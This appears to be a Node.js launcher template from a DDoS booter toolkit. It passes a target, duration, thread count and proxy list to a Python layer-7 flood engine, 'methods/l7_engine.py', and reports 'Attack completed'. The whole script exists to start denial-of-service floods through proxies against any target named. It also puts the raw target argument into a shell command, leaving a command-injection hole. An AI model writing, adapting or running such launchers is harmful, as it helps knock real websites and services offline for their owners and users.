#!/usr/bin/env node
const { execSync } = require('child_process');
const args = process.argv.slice(2);

if (args.length < 3) {
    console.log('Usage: node <method>.js <target> <time> <rate> <threads> [proxyFile]');
    process.exit(1);
}

const target = args[0];
const time = args[1];
const threads = args[3] || '100';
const proxyFile = args[4] || 'proxies.txt';

try {
    execSync(`python3 methods/l7_engine.py <method> "${target}" ${time} ${threads} ${proxyFile}`, {
        encoding: 'utf-8',
        stdio: 'inherit',
        timeout: (parseInt(time) + 10) * 1000
    });
} catch (e) {
    console.log('[<<METHOD>] Attack completed');
}